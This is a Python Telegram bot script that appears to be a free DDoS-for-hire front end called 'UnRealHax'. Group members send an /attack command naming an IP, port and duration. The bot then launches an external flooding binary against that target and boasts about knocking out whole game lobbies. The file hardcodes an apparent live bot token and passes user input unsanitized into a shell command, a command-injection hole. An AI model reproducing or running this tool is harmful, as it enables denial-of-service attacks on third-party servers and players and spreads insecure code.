import telebot
import asyncio
import time
import threading

TELEGRAM_BOT_TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'
ALLOWED_GROUP_ID = -1002298552334  # Replace with your group's ID
COOLDOWN_TIME = 120  # Cooldown duration in seconds
cooldowns = {}
GROUP_LINK = "https://t.me/+hZ4MOigxGKNhNzhl"
attack_in_progress = False  # To track if an attack is already running

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ALLOWED_GROUP_ID:
        bot.send_message(
            message.chat.id,
            f"*⚠️ Please use commands in the specific group only.*\n\n"
            f"Join the group here: [{GROUP_LINK}]({GROUP_LINK})",
            parse_mode='Markdown'
        )
        return

    bot.send_message(
        message.chat.id,
        "*🔥 Welcome to the UnRealHax 🔥*"
        "*Use /attack <ip> <port> <duration>*"
        "*Let Start Fucking ⚔️💥*",
        parse_mode='Markdown'
    )

def run_attack_thread(chat_id, ip, port, duration):
    asyncio.run(run_attack(chat_id, ip, port, duration))

async def run_attack(chat_id, ip, port, duration):
    global attack_in_progress
    try:
        process = await asyncio.create_subprocess_shell(
            f"./mrinmoy {ip} {port} {duration} 677",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        bot.send_message(chat_id, f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n*Thank you for using our Free service!*", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(message):
    global cooldowns, attack_in_progress

    if message.chat.id != ALLOWED_GROUP_ID:
        bot.send_message(
            message.chat.id,
            "*⚠️ Please use commands in the specific group only.*",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        bot.send_message(
            message.chat.id,
            "*⚠️ Another attack is already in progress. Please wait for it to finish.*",
            parse_mode='Markdown'
        )
        return

    user_id = str(message.from_user.id)
    args = message.text.split()[1:]

    if user_id in cooldowns:
        remaining_time = int(cooldowns[user_id] - time.time())
        if remaining_time > 0:
            bot.send_message(
                message.chat.id,
                f"*⚠️ You are on cooldown. Please wait {remaining_time} seconds before attacking again.*",
                parse_mode='Markdown'
            )
            return

    if len(args) != 3:
        bot.send_message(
            message.chat.id,
            "*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args

    try:
        duration = int(duration)
        if duration > 180:
            duration = 180
    except ValueError:
        bot.send_message(
            message.chat.id,
            "*⚠️ Duration must be a number.*",
            parse_mode='Markdown'
        )
        return

    bot.send_message(
        message.chat.id,
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby  💥*",
        parse_mode='Markdown'
    )

    cooldowns[user_id] = time.time() + COOLDOWN_TIME
    attack_in_progress = True  # Set attack in progress

    # Run the attack in a separate thread
    attack_thread = threading.Thread(target=run_attack_thread, args=(message.chat.id, ip, port, duration))
    attack_thread.start()

if __name__ == '__main__':
    bot.polling(none_stop=True)
